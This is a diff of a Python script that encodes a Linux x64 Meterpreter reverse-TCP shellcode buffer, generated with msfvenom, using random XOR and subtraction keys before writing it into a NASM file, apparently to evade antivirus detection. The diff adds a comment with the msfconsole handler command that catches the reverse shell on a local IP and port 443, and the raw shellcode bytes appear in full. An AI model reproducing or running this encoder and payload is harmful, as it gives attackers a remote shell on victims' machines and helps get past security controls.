@@ -10,12 +10,9 @@ key = ord(''.join(random.choice(string.ascii_letters + string.digits)))
 xor = ord(''.join(random.choice(string.ascii_letters + string.digits)))
 key2 = ''.join('0x{:02x}'.format(key))
 xor2 = ''.join('0x{:02x}'.format(xor))
-print(key)
-print(xor)
-print(key2)
-print(xor2)
 
 # msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=443 -f python
+# sudo msfconsole -x "use exploits/multi/handler; set lhost 192.168.x.x; set lport 443; set payload linux/x64/meterpreter/reverse_tcp; exploit -j"
 
 buf =  b""
 buf += b"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d"
@@ -30,13 +27,12 @@ buf += b"\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05"
 buf += b"\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6"
                                                               
 encoded = ""
-encoded2 = ""
 
 for x in (buf) :
 	y = x^xor
 
-	encoded2 += '0x%02x,' % (y-key & 0xff)
-encoded2 += '0x%02x' % key
+	encoded += '0x%02x,' % (y-key & 0xff)
+encoded += '0x%02x' % key
 
 
 nasm_file= f'''
